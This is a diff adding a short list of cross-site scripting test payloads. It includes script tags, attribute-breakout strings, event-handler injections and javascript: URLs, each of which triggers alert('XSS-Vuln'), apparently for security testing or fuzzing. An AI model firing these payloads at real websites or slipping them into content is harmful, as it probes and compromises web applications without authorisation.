@@ -1,0 +1,11 @@
+<script>alert('XSS-Vuln')</script>
+"><script>alert('XSS-Vuln')</script>
+'';!--"<XSS>=&{()}
+<img src=x onerror=alert('XSS-Vuln')>
+<svg/onload=alert('XSS-Vuln')>
+<body onload=alert('XSS-Vuln')>
+<iframe src="javascript:alert('XSS-Vuln')"></iframe>
+<div onmouseover="alert('XSS-Vuln')">HOVER ME</div>
+<a href="javascript:alert('XSS-Vuln')">Click Me</a>
+<details open ontoggle="alert('XSS-Vuln')">
+<input onfocus="alert('XSS-Vuln')" autofocus>
